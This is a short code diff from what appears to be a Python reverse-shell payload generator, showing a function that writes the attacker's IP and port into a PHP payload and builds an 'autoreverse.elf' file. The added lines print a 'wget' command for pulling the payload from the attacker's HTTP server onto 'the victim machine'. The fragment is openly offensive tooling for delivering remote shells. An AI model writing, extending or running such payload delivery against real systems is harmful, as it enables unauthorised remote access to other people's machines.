@@ -119,6 +119,8 @@ def Configure(IP = Get_IP(), PORT = str(args.port), msf = False, arch='64'):
             data[48] = "$ip = '" + IP + "';\n"
             data[49] = "$port = " + PORT + ";\n"
             archivo.writelines(data)
+        if args.httpserver != None:
+            print(blue('\nDownload your payload on the victim machine with: ') + red("\nwget http://" + IP + ":" + args.httpserver + "/" + file))
         message(file)
     elif payload == 'elf' or payload == '.elf':
         file = 'autoreverse.elf'
